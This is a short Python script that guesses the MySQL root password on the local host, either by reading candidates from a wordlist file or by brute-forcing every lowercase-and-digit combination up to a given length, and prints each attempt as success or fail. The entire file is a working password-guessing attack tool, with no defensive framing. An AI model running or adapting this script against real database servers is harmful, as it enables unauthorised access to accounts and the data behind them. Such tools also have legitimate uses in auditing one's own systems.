import sys
import time
import string
import itertools
import os
import mysql.connector
from mysql.connector import errorcode


try:
  flags = sys.argv[1]
  if flags == "-D":
    filename = sys.argv[2]
  elif flags == "-B":
    password_max_length = int(sys.argv[2])
except:
  print("please enter the right command")

if flags == "-D":
  file = open(filename, 'r')
  password_in_list = file.readline()

  while password_in_list:
    password_in_list = password_in_list.strip()
    try:
      conn = mysql.connector.connect(user='root', host='127.0.0.1', password=password_in_list)
      print("[*] " + password_in_list + " |  success")
      break
    except mysql.connector.Error as err:
      print("[*] " + password_in_list + " |  fail")
      password_in_list = file.readline()
      continue

    

  file.close()
elif flags == "-B":
  is_found = False
  chars = string.ascii_lowercase + string.digits
  for length in range(1,password_max_length):
    for guess in itertools.product(chars, repeat=length):
      guess = ''.join(guess)
      try:
        conn = mysql.connector.connect(user='root', host='127.0.0.1', password=guess)
        print("[*] " + guess + " |  success")
        is_found = True
        break
      except mysql.connector.Error as err:
        print("[*] " + guess + " |  fail")
        continue
    if is_found:
      break

